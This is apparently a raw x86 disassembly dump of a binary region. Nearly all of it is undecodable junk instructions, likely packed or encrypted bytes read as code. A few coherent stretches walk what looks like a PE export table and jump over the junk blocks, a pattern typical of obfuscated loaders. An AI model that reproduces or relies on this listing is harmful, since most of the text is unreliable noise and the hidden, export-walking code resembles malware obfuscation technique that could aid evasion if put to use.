  40ad76:	icebp  
  40ad77:	scas   al,BYTE PTR es:[edi]
  40ad78:	mov    cl,0xd0
  40ad7a:	jns    0x40ad2c
  40ad7c:	or     al,0xac
  40ad7e:	and    BYTE PTR [ecx],dh
  40ad80:	ss xchg ecx,eax
  40ad82:	push   ds
  40ad83:	iret   
  40ad84:	sub    dl,dl
  40ad86:	dec    ecx
  40ad87:	push   ss
  40ad88:	cmp    al,0x47
  40ad8a:	cmp    eax,0x4397102
  40ad8f:	pop    edx
  40ad90:	sti    
  40ad91:	outs   dx,DWORD PTR ds:[esi]
  40ad92:	ror    BYTE PTR fs:[edi],cl
  40ad95:	xchg   ebx,eax
  40ad96:	jns    0x40ad61
  40ad98:	popf   
  40ad99:	or     al,BYTE PTR [edx+0x60]
  40ad9c:	not    DWORD PTR [ecx+eiz*1]
  40ad9f:	inc    esp
  40ada0:	mov    ds:0x6413975e,eax
  40ada5:	icebp  
  40ada6:	test   eax,0xe504459c
  40adab:	sbb    eax,0xb3c569f9
  40adb0:	pop    esi
  40adb1:	dec    edx
  40adb2:	mov    ch,0xa
  40adb4:	call   0xcfd0:0xdcd5ce1b
  40adbb:	lods   al,BYTE PTR ds:[esi]
  40adbc:	cmp    eax,0xe118550c
  40adc1:	cmp    ebp,ebx
  40adc3:	stc    
  40adc4:	cmp    al,0xe4
  40adc6:	js     0x40ad55
  40adc8:	fstp   DWORD PTR [edx]
  40adca:	out    dx,eax
  40adcb:	ds scas al,BYTE PTR es:[edi]
  40adcd:	js     0x40ae49
  40adcf:	clc    
  40add0:	adc    eax,DWORD PTR [eax+0x2e]
  40add3:	arpl   WORD PTR [eax+0x56],bp
  40add6:	adc    eax,0x4cf34ae0
  40addb:	mov    bh,BYTE PTR [ecx+0x68]
  40adde:	(bad)  
  40addf:	(bad)  
  40ade0:	hlt    
  40ade1:	mov    bl,ah
  40ade3:	in     al,dx
  40ade4:	mov    dh,0x28
  40ade6:	adc    ecx,DWORD PTR [eax]
  40ade8:	jmp    0x64cfc68a
  40aded:	jno    0x40ae07
  40adef:	jge    0x40ae58
  40adf1:	mov    eax,0x88293376
  40adf6:	inc    edi
  40adf7:	in     al,0x7f
  40adf9:	jecxz  0x40adae
  40adfb:	adc    DWORD PTR [ebx+0x32],ebp
  40adfe:	xchg   esi,eax
  40adff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae00:	jmp    0xa4fec4f0
  40ae05:	or     eax,0xb6fef512
  40ae0a:	sub    DWORD PTR [ebx],ebx
  40ae0c:	pop    esp
  40ae0d:	mov    eax,ds:0xde2b9943
  40ae12:	jo     0x40ada4
  40ae14:	dec    ebx
  40ae15:	loop   0x40ae67
  40ae17:	jo     0x40ae4d
  40ae19:	call   0x3d0e0b90
  40ae1e:	and    eax,0x36f9e803
  40ae23:	sub    ebx,ecx
  40ae25:	mov    ah,0xf1
  40ae27:	sbb    BYTE PTR [esp+ebp*8],0x3e
  40ae2b:	mov    dh,0x2f
  40ae2d:	ror    DWORD PTR [ebp+0x2a],0x38
  40ae31:	clc    
  40ae32:	mov    ds:0xb0dc2cbf,al
  40ae37:	pop    ss
  40ae38:	ins    DWORD PTR es:[edi],dx
  40ae39:	aam    0x7b
  40ae3b:	xchg   esp,eax
  40ae3c:	mov    ebx,0x2908b6ab
  40ae41:	pop    ebp
  40ae42:	cmp    edi,edi
  40ae44:	fadd   QWORD PTR [edx-0xd]
  40ae47:	stos   DWORD PTR es:[edi],eax
  40ae48:	push   es
  40ae49:	pusha  
  40ae4a:	dec    edx
  40ae4b:	fiadd  DWORD PTR ds:0xfa28ea9b
  40ae51:	outs   dx,BYTE PTR ds:[esi]
  40ae52:	cmp    eax,0x1192dc5b
  40ae57:	inc    edi
  40ae58:	das    
  40ae59:	cwde   
  40ae5a:	add    ch,bh
  40ae5c:	xor    al,0xef
  40ae5e:	iret   
  40ae5f:	push   edx
  40ae60:	mov    cs,edx
  40ae62:	mov    dl,0xac
  40ae64:	and    esp,DWORD PTR [edi+0x3e]
  40ae67:	pushf  
  40ae68:	(bad)
  40ae6c:	addr16 push eax
  40ae6e:	mov    esi,0x64d11548
  40ae73:	and    ebx,edi
  40ae75:	shl    eax,0x69
  40ae78:	cmp    DWORD PTR [ebx],eax
  40ae7a:	ss or  eax,0xf860d486
  40ae80:	test   eax,0x575eb233
  40ae85:	fs retf 0x70ee
  40ae89:	push   ebx
  40ae8a:	or     DWORD PTR [edi],edi
  40ae8c:	(bad)  
  40ae8d:	sti    
  40ae8e:	cmp    eax,0x28b51c41
  40ae93:	cdq    
  40ae94:	dec    edx
  40ae95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae96:	sub    edx,DWORD PTR [edi+0x12897593]
  40ae9c:	cmp    eax,DWORD PTR [ebx+eax*8-0x235a75a4]
  40aea3:	mov    bh,0x21
  40aea5:	jo     0x40ae6a
  40aea7:	into   
  40aea8:	arpl   WORD PTR [eax],bx
  40aeaa:	mov    eax,DWORD PTR [ecx+0x57f819ee]
  40aeb0:	push   ds
  40aeb1:	std    
  40aeb2:	pop    esp
  40aeb3:	dec    eax
  40aeb4:	cmc    
  40aeb5:	push   0xb5f27a14
  40aeba:	mov    al,0xe5
  40aebc:	stc    
  40aebd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aebe:	scas   al,BYTE PTR es:[edi]
  40aebf:	cs add eax,0x2a4efaac
  40aec5:	mov    es,WORD PTR [edi-0x7b]
  40aec8:	aaa    
  40aec9:	call   0xff39:0x666c0c7f
  40aed0:	jo     0x40ae75
  40aed2:	sub    BYTE PTR [eax+0x3f],0xdb
  40aed6:	iret   
  40aed7:	or     edx,ecx
  40aed9:	stos   BYTE PTR es:[edi],al
  40aeda:	clc    
  40aedb:	shr    DWORD PTR [edi-0x79],cl
  40aede:	aas    
  40aedf:	in     al,0x7a
  40aee1:	mov    ds:0xa4aeefeb,eax
  40aee6:	dec    esi
  40aee7:	data16 mov al,0xc2
  40aeea:	inc    ebp
  40aeeb:	lods   eax,DWORD PTR ds:[esi]
  40aeec:	adc    esi,edx
  40aeee:	add    eax,0xa234a92b
  40aef3:	(bad)  
  40aef4:	call   0x5fa9:0x2c2eda62
  40aefb:	shr    edi,1
  40aefd:	pop    eax
  40aefe:	or     al,0x49
  40af00:	dec    esp
  40af01:	sub    al,ch
  40af03:	(bad)  
  40af04:	xor    edi,ecx
  40af06:	jmp    0xa2ccec2b
  40af0b:	sub    DWORD PTR [esi-0x52960e61],edx
  40af11:	dec    edx
  40af12:	mov    esi,0x2b88eb64
  40af17:	jne    0x40af78
  40af19:	and    ebp,DWORD PTR [esi]
  40af1b:	rcl    DWORD PTR [esi+0x58],0xdb
  40af1f:	jo     0x40af96
  40af21:	jb     0x40af4d
  40af23:	es pop eax
  40af25:	sbb    ebp,DWORD PTR [ebx+0x59]
  40af28:	shl    BYTE PTR [esi+0x48],cl
  40af2b:	in     eax,dx
  40af2c:	jae    0x40af50
  40af2e:	out    dx,eax
  40af2f:	pop    esi
  40af30:	adc    BYTE PTR [esi-0x68],al
  40af33:	jl     0x40aeeb
  40af35:	in     eax,0x3f
  40af37:	cmp    eax,0x2c48dec9
  40af3c:	fdiv   QWORD PTR ds:0x6955c14c
  40af42:	stos   BYTE PTR es:[edi],al
  40af43:	push   ecx
  40af44:	inc    esi
  40af45:	loop   0x40afa0
  40af47:	nop
  40af48:	add    eax,0xdf83b569
  40af4d:	test   BYTE PTR [eax],cl
  40af4f:	mov    ah,0xdc
  40af51:	sbb    BYTE PTR [edi+edx*2+0x7ed75fa9],al
  40af58:	inc    edx
  40af59:	retf   0x1e94
  40af5c:	xchg   ecx,eax
  40af5d:	sbb    ch,BYTE PTR [edi+eax*4]
  40af60:	loop   0x40afc1
  40af62:	bound  ebx,QWORD PTR [edi]
  40af64:	xlat   BYTE PTR ds:[ebx]
  40af65:	fisttp DWORD PTR [ebp+0x17]
  40af68:	pop    edi
  40af69:	mov    bh,0xa0
  40af6b:	push   ebp
  40af6c:	pop    edi
  40af6d:	lock and eax,0x408b49ec
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4337a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43375f
  40af93:	sub    DWORD PTR ds:0x43370f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43375b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43375b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43375b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43375b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43375b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43375b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43375b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43375b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4337a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	push   edi
  40b018:	clc    
  40b019:	loope  0x40afc2
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	sahf   
  40b024:	push   edi
  40b025:	adc    cl,al
  40b027:	call   0xcaab:0xc38211c3
  40b02e:	or     DWORD PTR [ebx],0x28
  40b031:	pop    ebp
  40b032:	shl    BYTE PTR [edx-0xd],0xa9
  40b036:	adc    ch,bl
  40b038:	adc    eax,0xfc8ad0ce
  40b03d:	(bad)  [ebp+0x72ea28d]
  40b043:	lahf   
  40b044:	push   cs
  40b045:	hlt    
  40b046:	push   edx
  40b047:	cmp    eax,0x9e291a18
  40b04c:	adc    esp,DWORD PTR [esi]
  40b04e:	push   es
  40b04f:	mov    esi,0x6b7a7b71
  40b054:	inc    ecx
  40b055:	ja     0x40b02b
  40b057:	push   ss
  40b058:	jg     0x40b04e
  40b05a:	sub    BYTE PTR [ebx],0x59
  40b05d:	jnp    0x40b031
  40b05f:	dec    esp
  40b060:	and    BYTE PTR [edx],dh
  40b062:	xchg   edx,eax
  40b063:	pop    ebx
  40b064:	jb     0x40b0a4
  40b066:	test   bl,al
  40b068:	or     DWORD PTR [ecx-0xa],ebx
  40b06b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b06c:	shr    DWORD PTR [esi+edi*2-0x49a66c97],1
  40b073:	out    0xab,al
  40b075:	(bad)  
  40b077:	loopne 0x40b081
  40b079:	adc    ebx,DWORD PTR ds:0xbad3c157
  40b07f:	cli    
  40b080:	xchg   ebx,eax
  40b082:	sar    bl,cl
  40b084:	sub    bl,BYTE PTR [ebx]
  40b086:	jae    0x40b0f9
  40b088:	adc    ch,BYTE PTR ds:0x6cfcd82a
  40b08e:	mov    ebx,0x940e5d11
  40b093:	mov    DWORD PTR [ecx],ebx
  40b095:	cwde   
  40b096:	push   ebp
  40b097:	repnz lds esp,FWORD PTR [ebx-0x27b55dd7]
  40b09e:	dec    ebp
  40b09f:	cwde   
  40b0a0:	push   0x9ba65c49
  40b0a5:	test   BYTE PTR [ebx-0x65],dl
  40b0a8:	jmp    ecx
  40b0aa:	mul    DWORD PTR [ecx-0x5]
  40b0ad:	enter  0xead9,0x4d
  40b0b1:	push   esp
  40b0b2:	repz imul eax,eax,0xffffffd1
  40b0b6:	xchg   ecx,eax
  40b0b7:	mov    edx,ebp
  40b0b9:	inc    edx
  40b0ba:	pop    ds
  40b0bb:	das    
  40b0bc:	ret    0xee02
  40b0bf:	xor    al,0x90
  40b0c1:	dec    ebp
  40b0c2:	sbb    al,0x15
  40b0c4:	push   edx
  40b0c5:	(bad)
  40b0c9:	adc    al,0x84
  40b0cb:	mov    al,ds:0xa72a73c1
  40b0d0:	inc    ebx
  40b0d1:	enter  0x99a1,0x41
  40b0d5:	inc    ebx
  40b0d6:	mov    dh,0xc2
  40b0d8:	add    ah,BYTE PTR [ebx+ebp*2]
  40b0db:	mov    ss,esi
  40b0dd:	mov    WORD PTR [ebx],?
  40b0df:	sti    
  40b0e0:	and    eax,0x2e1a3663
  40b0e5:	push   ebx
  40b0e6:	scas   al,BYTE PTR es:[edi]
  40b0e7:	imul   ebx,ebp,0xb4fe199c
  40b0ed:	lea    edx,[ebp+0x1e]
  40b0f0:	ja     0x40b0d2
  40b0f2:	jmp    0x9fd3:0xcdfa3473
  40b0f9:	push   cs
  40b0fa:	pop    ebp
  40b0fb:	mov    ch,0x93
  40b0fd:	test   eax,0x34b5f61
  40b102:	pop    edi
  40b103:	rcl    edx,0xe5
  40b106:	lods   eax,DWORD PTR ds:[esi]
  40b107:	(bad)  
  40b108:	fcomp  DWORD PTR [ebx-0x25b74929]
  40b10e:	test   BYTE PTR [ecx-0x5b],ch
  40b111:	je     0x40b0d4
  40b113:	in     eax,dx
  40b114:	push   eax
  40b115:	inc    esi
  40b116:	add    edi,edx
  40b118:	test   dl,al
  40b11a:	sub    DWORD PTR [esi+0x46],ebp
  40b11d:	shr    cl,1
  40b11f:	fs scas eax,DWORD PTR es:[edi]
  40b121:	imul   ecx,edi,0x66
  40b124:	jnp    0x40b114
  40b126:	popa   
  40b127:	fisttp WORD PTR [ebp+0x16d2e26d]
  40b12d:	dec    esi
  40b12e:	mov    eax,ds:0x5b6ad93
  40b133:	inc    edx
  40b134:	lea    ebp,[ebx+0x4640932]
  40b13a:	cwde   
  40b13b:	cdq    
  40b13c:	int3   
  40b13d:	pushf  
  40b13e:	ja     0x40b127
  40b140:	sbb    esi,edi
  40b142:	stos   BYTE PTR es:[edi],al
  40b143:	jae    0x40b122
  40b145:	push   ebx
  40b146:	mov    ebp,0x3e15d628
  40b14b:	push   edx
  40b14c:	popa   
  40b14d:	cwde   
  40b14e:	mov    edi,0xcd98b664
  40b153:	out    0x79,eax
  40b155:	mov    dl,0x97
  40b157:	rol    BYTE PTR [edx+0x1d],1
  40b15a:	jbe    0x40b197
  40b15c:	retf   0x34b7
  40b15f:	push   ebp
  40b160:	jnp    0x40b1c4
  40b162:	sar    DWORD PTR [esi-0x5],1
  40b165:	mov    bh,0x25
  40b167:	cli    
  40b168:	cwde   
  40b169:	add    dh,ah
  40b16b:	loopne 0x40b1b6
  40b16d:	dec    esp
  40b16e:	pop    edx
  40b16f:	(bad)  
  40b170:	sti    
  40b171:	push   ebx
  40b172:	mul    BYTE PTR [esi-0xd660b87]
  40b178:	sub    BYTE PTR [ebx],dh
  40b17a:	or     DWORD PTR ds:0xd4049674,eax
  40b180:	dec    edx
  40b181:	sar    BYTE PTR [ebp-0x75f3cdc6],1
  40b187:	jns    0x40b14a
  40b189:	outs   dx,DWORD PTR ds:[esi]
  40b18a:	or     BYTE PTR [edx+0x3d189c03],al
  40b190:	add    ecx,DWORD PTR ds:0xdfd50e
  40b196:	test   al,0x8a
  40b198:	mov    al,0x9f
  40b19a:	out    dx,al
  40b19b:	adc    eax,0xc93a5db9
  40b1a0:	scas   eax,DWORD PTR es:[edi]
  40b1a1:	mov    bh,0x58
  40b1a3:	daa    
  40b1a4:	(bad)  
  40b1a5:	enter  0x84af,0x64
  40b1a9:	push   esi
  40b1aa:	ins    BYTE PTR es:[edi],dx
  40b1ab:	mov    ebp,0xbf1d55ef
  40b1b0:	into   
  40b1b1:	mov    edx,DWORD PTR [ebp+0x34a153fd]
  40b1b7:	mov    esp,0x9a3258ce
  40b1bc:	jns    0x40b20f
  40b1be:	adc    eax,0x67744fab
  40b1c4:	sbb    al,BYTE PTR [eax-0x55240d55]
  40b1ca:	sub    eax,0x3c0c893b
  40b1cf:	xor    eax,0xf05f7b1b
  40b1d4:	push   ebx
  40b1d5:	xchg   edi,eax
  40b1d6:	xchg   edx,eax
  40b1d7:	es jae 0x40b1dd
  40b1da:	jo     0x40b242
  40b1dc:	pop    esp
  40b1dd:	inc    ebx
  40b1de:	scas   al,BYTE PTR es:[edi]
  40b1df:	in     al,0x55
  40b1e1:	jnp    0x40b169
  40b1e3:	or     ebx,eax
  40b1e5:	ret    0xda15
  40b1e8:	jge    0x40b1f3
  40b1ea:	test   eax,0x6fe8012b
  40b1ef:	inc    ebp
  40b1f0:	xchg   edx,eax
  40b1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f2:	pop    edi
  40b1f3:	add    ch,BYTE PTR [ecx+0x23d523ea]
  40b1f9:	fld    TBYTE PTR [ecx+0x293d956e]
  40b1ff:	inc    ebp
  40b200:	or     edx,DWORD PTR [ebp+0x4993c40f]
  40b206:	jae    0x40b1b8
  40b208:	sub    al,0xb7
  40b20a:	push   ds
  40b20b:	pop    es
  40b20c:	pop    esp
  40b20d:	out    dx,eax
  40b20e:	cmp    eax,0x3e50bb58
  40b213:	call   0xe884b8a9
  40b218:	cwde   
  40b219:	test   al,0x5d
  40b21b:	inc    ebx
  40b21c:	dec    ecx
  40b21d:	xor    al,0xfe
  40b21f:	repnz loope 0x40b260
  40b222:	dec    ebx
  40b223:	or     DWORD PTR [edi-0x7ea6c288],esp
  40b229:	sbb    ecx,ebp
  40b22b:	push   eax
  40b22c:	aaa    
  40b22d:	out    dx,al
  40b22e:	mov    bh,ch
  40b230:	push   eax
  40b231:	push   cs
  40b232:	repz and esp,0xffffffb0
  40b236:	and    cl,BYTE PTR [eax+0x4c]
  40b239:	outs   dx,DWORD PTR ds:[esi]
  40b23a:	int    0xa9
  40b23c:	xchg   ecx,eax
  40b23d:	ins    BYTE PTR es:[edi],dx
  40b23e:	pop    eax
  40b23f:	in     eax,dx
  40b240:	rol    DWORD PTR [ebx-0x10],0xd6
  40b244:	pop    es
  40b245:	arpl   WORD PTR [esi-0x1c9fe18d],dx
  40b24b:	jno    0x40b226
  40b24d:	push   esp
  40b24e:	fisttp WORD PTR [edx-0x41]
  40b251:	outs   dx,BYTE PTR ds:[esi]
  40b252:	(bad)  
  40b253:	inc    edi
  40b254:	sub    DWORD PTR [eax+0xe272ec6],edx
  40b25a:	dec    esp
  40b25b:	push   0x91143ec1
  40b260:	sbb    eax,0xf1967a79
  40b265:	icebp  
  40b266:	xchg   ebx,eax
  40b267:	outs   dx,BYTE PTR ds:[esi]
  40b268:	push   ebp
  40b269:	mov    eax,DWORD PTR [ebp-0x14]
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	dec    ebp
  40b284:	add    ebx,eax
  40b286:	(bad)  
  40b287:	cs bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	push   esi
  40b290:	dec    eax
  40b291:	mov    dl,0xc6
  40b293:	xchg   ebp,eax
  40b294:	jmp    0x88d4:0x7df07b33
  40b29b:	mov    ebp,0x6be240a3
  40b2a0:	int3   
  40b2a1:	xor    DWORD PTR [edx-0x32],edi
  40b2a4:	leave  
  40b2a5:	mov    eax,ds:0x20c8d66e
  40b2aa:	mov    DWORD PTR [edi+0x21],ebx
  40b2ad:	popf   
  40b2ae:	sbb    eax,0x8d068e05
  40b2b3:	xchg   esp,eax
  40b2b4:	in     al,0x54
  40b2b6:	sbb    eax,0x55c78e0f
  40b2bb:	adc    al,0xc7
  40b2bd:	sbb    al,0xca
  40b2bf:	scas   al,BYTE PTR es:[edi]
  40b2c0:	jp     0x40b2b7
  40b2c2:	mov    bh,0x38
  40b2c4:	cmp    edi,DWORD PTR [eax+0x27a58f4c]
  40b2ca:	les    eax,FWORD PTR [edx-0x65]
  40b2cd:	retf   
  40b2ce:	jg     0x40b304
  40b2d0:	fadd   DWORD PTR [eax]
  40b2d2:	sbb    edx,DWORD PTR [esi-0x53]
  40b2d5:	mov    BYTE PTR [ecx+0x38],al
  40b2d8:	sub    al,0xb6
  40b2da:	push   edx
  40b2db:	and    eax,0xb8747f43
  40b2e0:	inc    eax
  40b2e1:	cmp    al,0xf8
  40b2e3:	aas    
  40b2e4:	adc    eax,edx
  40b2e6:	in     eax,0xd7
  40b2e8:	dec    edx
  40b2e9:	int3   
  40b2ea:	xchg   esp,eax
  40b2eb:	cmp    eax,0x939de6a6
  40b2f0:	leave  
  40b2f1:	setb   bl
  40b2f4:	sbb    al,0x1b
  40b2f6:	mov    bl,0x9e
  40b2f8:	fisub  WORD PTR [ebx+0x33389a63]
  40b2fe:	add    BYTE PTR [eax+eiz*8-0x3f552890],bh
  40b305:	out    0xbf,eax
  40b307:	jne    0x40b2e1
  40b309:	and    DWORD PTR [esi],esi
  40b30b:	outs   dx,BYTE PTR ds:[esi]
  40b30c:	xor    BYTE PTR [esi-0x61aeb14b],cl
  40b312:	mov    ds:0xfec7d084,eax
  40b317:	ret    
  40b318:	pop    ecx
  40b319:	stos   DWORD PTR es:[edi],eax
  40b31a:	xor    al,BYTE PTR [edx+ebx*4+0xff697cc]
  40b321:	adc    ecx,ebp
  40b323:	xchg   DWORD PTR [edi+0x70ecd841],ebx
  40b329:	dec    esi
  40b32a:	mov    bl,0xf1
  40b32c:	sbb    edi,0xffffff96
  40b32f:	mov    ebp,0x1e1776c
  40b334:	or     dh,BYTE PTR [edi+0x5b]
  40b337:	in     al,dx
  40b338:	in     al,dx
  40b339:	pop    eax
  40b33a:	repnz and BYTE PTR [eax],al
  40b33d:	xor    bh,BYTE PTR [eax-0x59]
  40b340:	or     eax,0x926c8e1
  40b345:	stos   DWORD PTR es:[edi],eax
  40b346:	das    
  40b347:	(bad)  [ecx]
  40b349:	mov    ah,0x17
  40b34b:	dec    esp
  40b34c:	or     DWORD PTR [esi],edx
  40b34e:	push   0x233d1fa0
  40b353:	dec    esp
  40b354:	xchg   ebx,eax
  40b355:	bound  edi,QWORD PTR [esp+ecx*8]
  40b358:	bound  edi,QWORD PTR [esi-0x59]
  40b35b:	sub    eax,0xbc4da404
  40b360:	retf   0x442d
  40b363:	inc    ebp
  40b364:	arpl   WORD PTR [edi],bp
  40b366:	test   eax,0x4cf45bfb
  40b36b:	dec    DWORD PTR [ecx]
  40b36d:	xor    ch,cl
  40b36f:	in     eax,0xc5
  40b371:	test   BYTE PTR [edx+0x19],al
  40b374:	or     BYTE PTR [edx],0x4f
  40b377:	sub    eax,0x6ec7b4b5
  40b37c:	test   BYTE PTR [edx-0x7949ce95],dl
  40b382:	lahf   
  40b383:	push   ds
  40b384:	mov    ds:0x2ff7ffd2,eax
  40b389:	pop    ebp
  40b38a:	or     BYTE PTR [ebx+0x5a1fb174],0x3e
  40b391:	rol    BYTE PTR [eax-0x1b],0xe4
  40b395:	cmp    al,0x45
  40b397:	sbb    DWORD PTR [esi],edi
  40b399:	pushw  0x35
  40b39c:	sbb    BYTE PTR [edx+0x56],ch
  40b39f:	xor    DWORD PTR [edi+0x198486b],0xa36ed35f
  40b3a9:	lods   al,BYTE PTR ds:[esi]
  40b3aa:	or     BYTE PTR [esi+0x189d463c],ah
  40b3b0:	cmp    al,0x99
  40b3b2:	push   edx
  40b3b3:	jmp    0x40b385
  40b3b5:	push   edi
  40b3b6:	sbb    eax,0x766d5032
  40b3bb:	xchg   esp,eax
  40b3bc:	sub    DWORD PTR [ebx+edx*2-0x48],esi
  40b3c0:	xchg   ebp,eax
  40b3c1:	sub    al,0xb0
  40b3c3:	cmovno edx,DWORD PTR [ecx]
  40b3c6:	imul   edx,DWORD PTR [edi+0x1e],0x112eaec4
  40b3cd:	in     al,0xe1
  40b3cf:	into   
  40b3d0:	add    BYTE PTR ds:0x6742b941,bl
  40b3d6:	bound  eax,QWORD PTR [eax-0x758e5073]
  40b3dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3dd:	cld    
  40b3de:	jb     0x40b3a5
  40b3e0:	push   ss
  40b3e1:	out    0x10,eax
  40b3e3:	pushf  
  40b3e4:	nop
  40b3e5:	out    dx,al
  40b3e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3e7:	aaa    
  40b3e8:	inc    ebx
  40b3e9:	leave  
  40b3ea:	scas   eax,DWORD PTR es:[edi]
  40b3eb:	lods   eax,DWORD PTR ds:[esi]
  40b3ec:	shl    ebp,1
  40b3ee:	mov    al,ds:0xfc81a56c
  40b3f3:	retf   0x2a72
  40b3f6:	pop    es
  40b3f7:	jb     0x40b3b6
  40b3f9:	jl     0x40b3b1
  40b3fb:	sub    edx,DWORD PTR [eax-0x63]
  40b3fe:	outs   dx,BYTE PTR ds:[esi]
  40b3ff:	aas    
  40b400:	xchg   ah,bh
  40b402:	mov    bh,0x39
  40b404:	jl     0x40b3f2
  40b406:	or     ebp,DWORD PTR [ecx]
  40b408:	outs   dx,DWORD PTR ds:[esi]
  40b409:	mov    bh,0x73
  40b40b:	out    0xd0,eax
  40b40d:	jmp    DWORD PTR [ecx]
  40b40f:	add    eax,0xd78a9cf
  40b414:	retf   
  40b415:	test   BYTE PTR [esi],bh
  40b417:	pop    eax
  40b418:	pop    edi
  40b419:	dec    edx
  40b41a:	pusha  
  40b41b:	icebp  
  40b41c:	aad    0x5e
  40b41e:	js     0x40b474
  40b420:	shl    BYTE PTR [edi+edx*2-0x1],1
  40b424:	loope  0x40b492
  40b426:	inc    eax
  40b427:	dec    esi
  40b428:	(bad)  
  40b429:	(bad)  [ebp+0x1b]
  40b42c:	cmp    esi,DWORD PTR ds:0x537bb486
  40b432:	jbe    0x40b42a
  40b434:	out    dx,eax
  40b435:	xor    DWORD PTR [eax],edi
  40b437:	inc    ecx
  40b438:	call   0x54dd:0xad26fbc9
  40b43f:	mov    ds,WORD PTR [ecx+0x6129370f]
  40b445:	ror    DWORD PTR [ebx-0x35185501],0xf
  40b44c:	adc    DWORD PTR [edx-0x3],ebx
  40b44f:	push   es
  40b450:	inc    ecx
  40b451:	inc    ebx
  40b452:	or     esi,edi
  40b454:	loope  0x40b482
  40b456:	leave  
  40b457:	adc    BYTE PTR [ebx],bh
  40b459:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b45b:	pop    ss
  40b45c:	xor    al,0x8e
  40b45e:	int    0xe
  40b460:	push   es
  40b461:	cs cmp eax,0x1d1d25a
  40b467:	mov    esp,DWORD PTR [eax-0x6d5c1cd3]
  40b46d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b46e:	or     ah,al
  40b470:	mov    esp,0xf1b5ebd9
  40b475:	fistp  QWORD PTR [ecx+edx*8]
  40b479:	push   0xffffffd4
  40b47b:	mov    ds:0xab451f9b,eax
  40b480:	cmp    DWORD PTR ds:0x2d27e4e9,0x4b
  40b487:	cmp    al,0x17
  40b489:	aas    
  40b48a:	jo     0x40b4da
  40b48c:	pop    ds
  40b48d:	mov    eax,ds:0xfe73bef8
  40b492:	data16 rcl BYTE PTR [ebx-0x4b02b1fe],cl
  40b499:	mov    eax,ds:0x7048eccb
  40b49e:	xchg   edx,eax
  40b49f:	adc    eax,0x50670465
  40b4a4:	and    edi,DWORD PTR [ebx+0x4d6eb3a0]
  40b4aa:	and    DWORD PTR ds:0xff5073f5,esi
  40b4b0:	pop    edx
  40b4b1:	into   
  40b4b2:	mov    ebp,0xc7e08016
  40b4b7:	xchg   edi,eax
  40b4b8:	ss stos BYTE PTR es:[edi],al
  40b4ba:	mov    esp,0x2c01cee8
  40b4bf:	mov    ch,0xb3
  40b4c1:	and    BYTE PTR [ecx],dl
  40b4c3:	sbb    ch,BYTE PTR [esi]
  40b4c5:	addr16 xchg ecx,eax
  40b4c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4c8:	mov    dl,0xc7
  40b4ca:	mov    bh,BYTE PTR [esi-0x58]
  40b4cd:	xchg   ebp,eax
  40b4ce:	(bad)  
  40b4cf:	popa   
  40b4d0:	jg     0x40b4a3
  40b4d2:	dec    edx
  40b4d3:	jecxz  0x40b4bf
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	xchg   edi,eax
  40b508:	(bad)  
  40b509:	retf   
  40b50a:	jle    0x40b4f4
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	bound  edx,QWORD PTR [ecx]
  40b515:	or     cl,BYTE PTR [esi-0x20]
